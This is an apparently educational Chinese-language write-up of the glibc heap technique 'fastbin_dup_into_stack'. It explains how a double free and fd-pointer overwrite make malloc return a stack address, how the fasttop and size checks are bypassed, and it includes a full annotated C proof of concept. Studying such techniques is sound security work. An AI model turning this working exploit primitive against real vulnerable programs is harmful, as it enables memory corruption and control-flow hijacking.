# 漏洞利用文档：fastbin_dup_into_stack

## 攻击对象
fastbin的0x20大小bin中的chunk元数据，特别是fd（forward pointer）指针。具体目标是通过修改fastbin链表中的fd指针，使其指向栈上的一个伪造chunk，从而控制malloc的返回地址。攻击针对堆内存中的fastbin管理结构，利用元数据操作实现任意地址分配。

## 利用过程
1. **分配三个堆块**：分配三个大小为8字节的堆块（a、b、c），用于后续操作。
2. **首次释放**：释放堆块a，将其加入fastbin的0x20大小链表。
3. **释放堆块b**：释放堆块b，其fd指针指向堆块a，形成链表 b → a → NULL。
4. **Double Free**：再次释放堆块a（double free），创建循环链表 a → b → a → ...，为修改fd指针做准备。
5. **获取控制权**：通过malloc(8)获取堆块a的控制权（指针d），然后再次malloc(8)获取堆块b，使fastbin链表仅剩堆块a。
6. **修改fd指针**：使用指针d修改堆块a的fd指针，指向栈上的伪造chunk（地址为`&stack_var - 8`）。
7. **分配栈地址**：后续malloc(8)操作返回指向栈的指针，实现任意地址写。

## 利用条件
- **Double Free漏洞**：程序中存在悬空指针，允许同一chunk被释放多次（这里堆块a被释放两次）。
- **Use-After-Free (UAF)**：通过malloc获取已释放chunk的控制权，允许写操作修改fd指针。
- **堆布局可控**：需要分配特定大小的chunk（0x20字节）以匹配fastbin大小，且栈地址可预测或已知。

## 利用效果
- **任意地址分配**：malloc返回指向栈的指针（如`0x7fffffffe308`），允许在栈上进行任意写操作。
- **潜在控制流劫持**：通过写栈上的返回地址或函数指针，可能实现代码执行或权限提升。
- **内存破坏**：破坏fastbin链表 integrity，可能导致程序崩溃或进一步利用。

## 涉及缓解机制
Glibc在堆管理中包含以下检查机制，但本利用通过特定操作绕过：
- **Double Free检查**：在`_int_free`函数中，Glibc检查释放的chunk是否是当前fastbin的head（通过`old == p`比较）。如果释放的chunk是head，会触发abort。本利用通过先释放b再释放a，使a不是head，从而绕过检查。
  - 伪代码（基于Glibc源码）：
    ```c
    if (__builtin_expect (old == p, 0)) {
      errstr = "double free or corruption (fasttop)";
      goto errout;
    }
    ```
- **Size匹配检查**：在malloc从fastbin获取chunk时，检查chunk的size是否与bin的index匹配。伪造的栈chunk设置了size为0x20，匹配0x20大小bin，从而绕过检查。
  - 伪代码：
    ```c
    if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) {
      errstr = "malloc(): memory corruption (fast)";
      goto errout;
    }
    ```

## Proof of Concept
以下是漏洞利用原型的源码，添加了中文注释以解释关键步骤。

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
           "returning a pointer to a controlled location (in this case, the stack).\n");

    unsigned long long stack_var; // 栈变量，用于伪造chunk的size

    fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

    fprintf(stderr, "Allocating 3 buffers.\n");
    int *a = malloc(8); // 分配第一个堆块a
    int *b = malloc(8); // 分配第二个堆块b
    int *c = malloc(8); // 分配第三个堆块c

    fprintf(stderr, "1st malloc(8): %p\n", a);
    fprintf(stderr, "2nd malloc(8): %p\n", b);
    fprintf(stderr, "3rd malloc(8): %p\n", c);

    fprintf(stderr, "Freeing the first one...\n");
    free(a); // 首次释放a，加入fastbin

    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    // free(a); // 直接再次释放a会触发double free检查，但这里注释掉

    fprintf(stderr, "So, instead, we'll free %p.\n", b);
    free(b); // 释放b，其fd指向a，形成链表 b -> a -> NULL

    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
    free(a); // 再次释放a（double free），创建循环链表 a -> b -> a -> ...

    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    unsigned long long *d = malloc(8); // 第一次malloc，获取a的控制权（指针d）

    fprintf(stderr, "1st malloc(8): %p\n", d);
    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8)); // 第二次malloc，获取b，fastbin只剩a
    fprintf(stderr, "Now the free list has [ %p ].\n", a);
    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        "so that malloc will think there is a free chunk there and agree to\n"
        "return a pointer to it.\n", a);
    stack_var = 0x20; // 设置栈变量为0x20，伪造chunk的size字段

    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d)); // 关键步骤：修改a的fd指针，指向栈地址（伪造chunk的起始位置）

    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8)); // 第三次malloc，返回a，此时fastbin包含栈地址
    fprintf(stderr, "4th malloc(8): %p\n", malloc(8)); // 第四次malloc，返回指向栈的指针，利用成功
}
```

### 注释说明
- **关键步骤**：通过double free创建循环链表后，使用指针d修改堆块a的fd指针，将其指向栈上的伪造chunk。伪造chunk的size设置为0x20以匹配fastbin大小检查。
- **利用成功**：最后malloc(8)返回栈地址，证明任意地址分配 achieved。此PoC可用于测试和演示fastbin攻击。